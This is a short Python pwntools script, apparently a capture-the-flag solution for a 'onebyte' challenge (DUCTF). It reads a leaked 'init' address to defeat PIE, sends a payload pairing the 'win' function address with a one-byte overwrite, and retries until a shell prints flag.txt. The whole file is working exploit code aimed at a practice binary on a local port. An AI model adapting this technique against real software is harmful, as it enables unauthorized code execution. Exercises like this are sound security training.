from pwn import *

attempt = 1
while True:
    print(f'attempt {attempt}')
    attempt += 1
    # conn = process('../publish/onebyte')
    conn = remote('0.0.0.0', 1337)
    exe = ELF('../publish/onebyte')

    init_addr = int(conn.recvline().decode().split('Free junk: ')[1], 16)

    base = init_addr - exe.symbols['init']
    exe.address = base
    payload = p32(exe.symbols['win']) + b'x' * 4 * 3 + b'\x24'
    conn.send(payload)

    conn.sendline(b'cat flag.txt')
    try:
        flag = conn.recvline().decode()
        conn.close()
        print(flag)
        if 'DUCTF' in flag:
            break
    except EOFError:
        conn.close()
